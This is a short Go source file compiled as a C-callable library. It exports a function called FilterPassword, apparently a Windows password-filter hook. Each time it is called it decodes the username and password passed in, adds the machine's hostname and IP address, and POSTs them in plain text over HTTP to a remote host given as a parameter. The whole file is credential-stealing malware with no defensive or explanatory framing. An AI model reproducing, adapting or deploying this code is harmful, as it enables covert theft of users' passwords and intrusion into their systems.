package main

import "C"
import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"
)

func main() {}
func getIPAddress() string {
	i, err := net.Interfaces()
	if err != nil {
		return "<nil>"
	}
	for _, a := range i {
		if a.Flags&net.FlagUp == 0 || a.Flags&net.FlagLoopback != 0 {
			continue
		}
		if n, err := a.Addrs(); err == nil {
			for _, ad := range n {
				var r net.IP
				switch ad.(type) {
				case *net.IPNet:
					r = ad.(*net.IPNet).IP
				case *net.IPAddr:
					r = ad.(*net.IPAddr).IP
				default:
					continue
				}
				if r.IsLoopback() || r.IsUnspecified() || r.IsMulticast() || r.IsInterfaceLocalMulticast() || r.IsLinkLocalMulticast() || r.IsLinkLocalUnicast() {
					continue
				}
				if p := r.To4(); p != nil {
					return p.String()
				}
				return r.String()
			}
		} else {
			return "<nil>"
		}
	}
	return "<nil>"
}

//export FilterPassword
func FilterPassword(s *C.char, l C.int, u *C.char, n C.int, p *C.char) C.int {
	a := []byte(C.GoStringN(u, l))
	y := []byte(C.GoStringN(p, n))
	e := make([]rune, l/2)
	k := make([]rune, n/2)
	for i := 0; i < len(a); i += 2 {
		e[i/2] = rune(a[i])
	}
	for i := 0; i < len(y); i += 2 {
		k[i/2] = rune(y[i])
	}
	h, err := os.Hostname()
	if err != nil {
		h = ""
	}
	d := bytes.NewReader([]byte(fmt.Sprintf("[%s:(%s)%s:%s]\n", h, getIPAddress(), string(e), string(k))))
	r, err := http.NewRequest("POST", fmt.Sprintf("http://%s/p/", C.GoString(s)), d)
	if err != nil {
		return C.int(-1)
	}
	x, _ := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
	b, err := http.DefaultClient.Do(r.WithContext(x))
	if err != nil {
		return C.int(-1)
	}
	b.Body.Close()
	return C.int(0)
}
